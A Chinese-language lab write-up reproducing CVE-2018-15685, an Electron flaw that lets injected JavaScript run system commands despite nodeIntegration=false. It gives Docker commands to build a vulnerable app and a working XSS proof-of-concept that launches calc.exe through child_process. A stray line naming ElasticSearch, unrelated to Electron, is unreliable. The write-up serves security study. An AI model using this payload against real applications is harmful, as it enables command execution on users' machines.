## 漏洞描述

1.漏洞编号：CVE-2018-15685

2.影响版本：

3.漏洞产生原因：

Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。
Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。

Electron在设置了`nodeIntegration=false`的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。

参考链接：

> \- https://electronjs.org/blog/web-preferences-fix
>
> \- https://www.contrastsecurity.com/security-influencers/cve-2018-15685

启动环境:docker-compose up -d

vulnIP:192.168.1.232

环境启动后，访问`http://your-ip:8080`即可看到Electron默认首页。![1613301801_60290829575bc00c274b3.png!small?1613301802113](https://image.3001.net/images/20210214/1613301801_60290829575bc00c274b3.png!small?1613301802113)

## 编译APP

执行如下命令编译一个包含漏洞的应用：

    
    
    ```
    docker-compose run -e PLATFORM=win64 --rm electron
    ```

![1613301828_6029084488f9dfd922b53.png!small?1613301829288](https://image.3001.net/images/20210214/1613301828_6029084488f9dfd922b53.png!small?1613301829288)

其中PLATFORM的值是运行该应用的操作系统，可选项有：`win64`、`win32`、`mac`、`linux`。

编译完成后，再执行如下命令，启动web服务：

    
    
    ```
    docker-compose run --rm -p 8080:80 web
    ```

![1613301841_60290851c5ebf36bc96dc.png!small?1613301842553](https://image.3001.net/images/20210214/1613301841_60290851c5ebf36bc96dc.png!small?1613301842553)

此时，访问`http://your-ip:8080/cve-2018-15685.tar.gz`即可下载编译好的应用。

![1613301851_6029085b29c7aa360a5b6.png!small?1613301852025](https://image.3001.net/images/20210214/1613301851_6029085b29c7aa360a5b6.png!small?1613301852025)

![1613301859_602908638c346d4ef4697.png!small?1613301860242](https://image.3001.net/images/20210214/1613301859_602908638c346d4ef4697.png!small?1613301860242)

![1613301871_6029086f01c69a1edeffc.png!small?1613301871764](https://image.3001.net/images/20210214/1613301871_6029086f01c69a1edeffc.png!small?1613301871764)

## 漏洞发现

关注ElasticSearch的版本

## 漏洞利用

在本地打开应用：

![1613301885_6029087d9a7d37e461a9d.png!small?1613301886354](https://image.3001.net/images/20210214/1613301885_6029087d9a7d37e461a9d.png!small?1613301886354)

![1613301891_6029088366e76dfee909a.png!small?1613301892137](https://image.3001.net/images/20210214/1613301891_6029088366e76dfee909a.png!small?1613301892137)

点击提交，输入框中的内容将会显示在应用中，显然这里存在一处XSS漏洞。

我们提交`<img src=1
onerror="require('child_process').exec('calc.exe')">`，发现没有任何反馈，原因就是`nodeIntegration=false`。

此时，提交POC（Windows）：

    
    
    ```
    
    <img src=1 onerror="window.open().open('data:text/html,<script>require(\'child_process\').exec(\'calc.exe\')</script>');">
    
    ```

可见，calc.exe已成功弹出：

![1613301910_60290896996a20f596979.png!small?1613301911340](https://image.3001.net/images/20210214/1613301910_60290896996a20f596979.png!small?1613301911340)

